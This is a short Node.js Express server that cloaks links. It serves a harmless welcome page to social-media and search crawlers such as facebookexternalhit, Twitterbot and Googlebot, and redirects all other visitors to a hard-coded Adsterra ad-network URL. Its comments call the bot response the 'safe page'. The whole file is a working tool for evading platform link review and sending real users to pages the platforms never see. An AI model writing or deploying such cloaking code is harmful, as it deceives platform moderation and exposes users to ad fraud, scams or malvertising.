const express = require("express");
const app = express();

// List of known Facebook bots
const botUserAgents = [
  "facebookexternalhit",
  "Facebot",
  "Twitterbot",
  "Pinterest",
  "WhatsApp",
  "Googlebot",
];

// Catch all routes (not just "/")
app.get("*", (req, res) => {
  const userAgent = req.headers["user-agent"] || "";

  if (botUserAgents.some((bot) => userAgent.includes(bot))) {
    // Bot detected – show safe page
    res.send("<h1>Welcome to our website!</h1>");
  } else {
    // Real user – redirect to Adsterra (replace with your target link)
    res.redirect("https://accountantflowerrespiration.com/tuwtzixg?key=c0faee8161723cbcaa2ac9d9a56c3ee9");
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
